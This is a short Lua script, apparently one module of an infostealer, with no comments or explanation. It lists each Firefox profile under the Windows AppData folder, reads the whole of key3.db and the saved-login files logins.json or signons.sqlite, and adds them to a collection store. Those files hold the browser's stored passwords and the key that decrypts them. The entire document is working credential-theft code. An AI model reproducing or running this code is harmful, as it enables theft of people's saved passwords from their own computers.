local CSIDL_APPDATA = 0x001a

local firefox_path = windows.getfolder(CSIDL_APPDATA) .. "\\Mozilla\\Firefox\\Profiles\\"

local readAll = function (file)
    local f = io.open(file, "rb")
    local content = f:read("*all")
    f:close()
    return content
end

local file_exists = function (name)
   local f=io.open(name,"r")
   if f~=nil then io.close(f) return true else return false end
end

for dir in io.popen("dir " .. firefox_path .. " /b /ad"):lines() do 
	local path = firefox_path .. dir .. "\\"
	local profile = dir .. '|'

	if file_exists(path .. "key3.db") and (file_exists(path .. "logins.json") or file_exists(path .. "signons.sqlite")) then 
		database.add(52, 3, profile .. readAll(path .. "key3.db"))
		if file_exists(path .. "logins.json") then 
			database.add(51, 3, profile .. readAll(path .. "logins.json"))
		else
			if file_exists(path .. "signons.sqlite") then 
				database.add(51, 3, profile .. '\0' .. readAll(path .. "signons.sqlite"))
			end
		end
	end
end
